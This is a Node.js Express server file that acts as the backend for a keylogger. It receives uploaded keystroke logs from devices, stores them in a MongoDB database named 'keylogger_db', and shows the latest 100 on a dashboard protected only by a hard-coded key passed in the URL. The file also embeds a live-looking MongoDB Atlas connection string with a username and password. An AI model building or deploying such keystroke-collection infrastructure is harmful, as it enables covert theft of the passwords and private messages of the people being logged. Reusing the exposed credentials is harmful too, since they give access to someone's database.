const express = require('express');
const { MongoClient } = require('mongodb');
const bodyParser = require('body-parser');
const path = require('path');

// ────────────────────────────────────────────────
//   FORCE SHOW ALL ERRORS - DO NOT SILENT FAIL
// ────────────────────────────────────────────────
process.on('uncaughtException', (err) => {
  console.error('┌───────────────────────────────┐');
  console.error('│ UNCAUGHT EXCEPTION CAUGHT     │');
  console.error('└───────────────────────────────┘');
  console.error(err.stack || err);
  console.error('Process will continue but this is serious.');
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('┌───────────────────────────────┐');
  console.error('│ UNHANDLED PROMISE REJECTION   │');
  console.error('└───────────────────────────────┘');
  console.error('Reason:', reason.stack || reason);
  console.error('Promise:', promise);
});

// Start debug session
console.log('========================================');
console.log('Starting keylogger-backend server...');
console.log('Node version:', process.version);
console.log('Current working directory:', process.cwd());
console.log('========================================');

const app = express();

const SECRET_KEY = 'test123abc';

const mongoUri = 'mongodb+srv://rxmha2:mimimithila125@cluster0.c0qkq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';

console.log('MongoDB URI loaded (password hidden):', mongoUri.replace(/:.*@/, ':****@'));

// Cached connection
let cachedClient = null;
let cachedDb = null;

async function getDb() {
  console.log('getDb() called - checking cache...');

  if (cachedDb) {
    console.log('→ Using cached MongoDB connection');
    return cachedDb;
  }

  console.log('→ No cache → creating new MongoClient...');

  const client = new MongoClient(mongoUri, {
    connectTimeoutMS: 10000,
    serverSelectionTimeoutMS: 10000,
    socketTimeoutMS: 20000,
    maxPoolSize: 5,
    retryWrites: true
  });

  try {
    console.log('Attempting to connect to MongoDB Atlas...');
    await client.connect();
    console.log('MongoDB CONNECT SUCCESS');
    cachedClient = client;
    cachedDb = client.db('keylogger_db');
    console.log('Database selected: keylogger_db');
    return cachedDb;
  } catch (err) {
    console.error('┌───────────────────────────────┐');
    console.error('│ MONGO CONNECT FAILED          │');
    console.error('└───────────────────────────────┘');
    console.error('Error name:', err.name);
    console.error('Error message:', err.message);
    console.error('Full error:', err);
    if (err.stack) console.error('Stack:', err.stack);
    throw err;
  }
}

// ────────────────────────────────────────────────
// Middleware
// ────────────────────────────────────────────────
console.log('Setting up middleware...');
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../views'));
console.log('Middleware ready');

// ────────────────────────────────────────────────
// Routes
// ────────────────────────────────────────────────

app.get('/', (req, res) => {
  console.log('GET / - root route hit');
  res.send('Keylogger backend is running. Dashboard: /dashboard?auth=test123abc');
});

app.post('/upload', async (req, res) => {
  console.log('POST /upload received');
  console.log('Headers:', req.headers);
  console.log('Body size:', JSON.stringify(req.body).length, 'bytes');

  let db;
  try {
    db = await getDb();
  } catch (err) {
    console.error('DB connection failed in /upload');
    return res.status(503).json({ error: 'Database connection failed' });
  }

  const authHeader = req.headers['authorization'];
  if (!authHeader || authHeader !== `Bearer ${SECRET_KEY}`) {
    console.warn('Unauthorized upload attempt');
    return res.status(401).json({ error: 'Unauthorized' });
  }

  const { device, logs, timestamp } = req.body;
  if (!device || !logs || !timestamp) {
    console.warn('Missing fields in upload payload');
    return res.status(400).json({ error: 'Missing required fields' });
  }

  try {
    console.log('Inserting document...');
    await db.collection('keystrokes').insertOne({
      device,
      logs,
      timestamp,
      received_at: new Date().toISOString()
    });
    console.log('Insert success');
    res.status(200).json({ success: true });
  } catch (err) {
    console.error('Insert failed:', err.message);
    res.status(500).json({ error: 'Insert failed' });
  }
});

app.get('/dashboard', async (req, res) => {
  console.log('GET /dashboard hit - auth query:', req.query.auth);

  let db;
  try {
    db = await getDb();
  } catch (err) {
    console.error('DB connection failed in /dashboard');
    return res.status(503).send('Database connection failed - check server logs');
  }

  const auth = req.query.auth;
  if (auth !== SECRET_KEY) {
    console.warn('Invalid dashboard auth attempt:', auth);
    return res.status(401).send('Access denied. Invalid auth key.');
  }

  try {
    console.log('Fetching logs from collection...');
    const logs = await db.collection('keystrokes')
      .find({})
      .sort({ received_at: -1 })
      .limit(100)
      .toArray();

    console.log('Found', logs.length, 'logs');
    res.render('dashboard', { logs });
  } catch (err) {
    console.error('Query failed:', err.message);
    res.status(500).send('Failed to load logs - check server logs');
  }
});

// Start server locally only (Vercel ignores listen)
if (process.env.NODE_ENV !== 'production') {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`========================================`);
    console.log(`Server is listening on http://localhost:${PORT}`);
    console.log(`Test dashboard: http://localhost:${PORT}/dashboard?auth=${SECRET_KEY}`);
    console.log(`========================================`);
  });
}

console.log('Module loaded successfully - exporting app');
module.exports = app;
